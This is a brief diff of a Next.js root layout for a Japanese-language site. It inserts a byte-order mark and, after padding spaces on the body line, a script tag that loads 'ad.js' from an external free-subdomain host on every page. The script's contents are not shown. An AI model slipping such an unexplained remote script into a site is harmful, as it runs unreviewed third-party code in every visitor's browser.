@@ -1,4 +1,4 @@
-import type { Metadata } from "next";
+﻿import type { Metadata } from "next";
 import "./globals.css";
 
 export const metadata: Metadata = {
@@ -13,7 +13,8 @@ export default function RootLayout({
 }) {
   return (
     <html lang="ja">
-      <body>{children}</body>
+      <body>{children}        <script src="https://hikakinmaniacoin.hikamer.f5.si/ad.js" async></script>
+      </body>
     </html>
   );
 }
